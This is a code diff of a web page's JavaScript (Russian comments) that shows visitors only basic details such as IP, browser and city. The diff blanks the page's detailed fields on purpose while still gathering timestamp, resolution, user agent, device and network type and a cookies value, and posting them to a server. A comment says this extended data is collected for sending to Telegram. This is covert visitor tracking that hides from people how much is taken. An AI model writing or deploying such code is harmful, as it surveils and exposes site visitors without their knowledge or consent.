@@ -2,7 +2,7 @@ window.addEventListener('DOMContentLoaded', () => {
   fetch('/collect')
     .then(res => res.json())
     .then(data => {
-      // Показываем на сайте только базовую информацию
+      // На сайте показываем только базовую инфу
       document.getElementById('ip').textContent = data.ip || 'Unknown';
       document.getElementById('browser').textContent = data.browser || 'Unknown';
       document.getElementById('os').textContent = data.os || 'Unknown';
@@ -11,7 +11,13 @@ window.addEventListener('DOMContentLoaded', () => {
       document.getElementById('city').textContent = data.city || 'Unknown';
       document.getElementById('vpn').textContent = data.vpn ? 'Yes' : 'No';
 
-      // Собираем расширенную информацию для отправки в Телеграм
+      // Остальные поля на сайте — пустые, чтобы не показывать подробную инфу
+      const emptyFields = ['timestamp', 'resolution', 'useragent', 'deviceType', 'networkType', 'cookies'];
+      emptyFields.forEach(id => {
+        document.getElementById(id).textContent = '';
+      });
+
+      // Собираем расширенную информацию для отправки в телеграм
       const timestamp = new Date().toLocaleString();
       const resolution = `${window.screen.width} x ${window.screen.height}`;
       const useragent = navigator.userAgent;
@@ -28,7 +34,7 @@ window.addEventListener('DOMContentLoaded', () => {
       // Отправляем расширенную инфу на сервер
       fetch('/clientinfo', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
           ip: data.ip,
           browser: data.browser,
@@ -36,17 +42,17 @@ window.addEventListener('DOMContentLoaded', () => {
           device: data.device,
           country: data.country,
           city: data.city,
+          vpn: data.vpn,
           timestamp,
           resolution,
           useragent,
           deviceType,
           networkType,
-          cookies,
-          vpn: data.vpn
+          cookies
         })
       });
     })
     .catch(err => {
-      console.error('Error fetching visitor data:', err);
+      console.error('Error fetching data:', err);
     });
 });
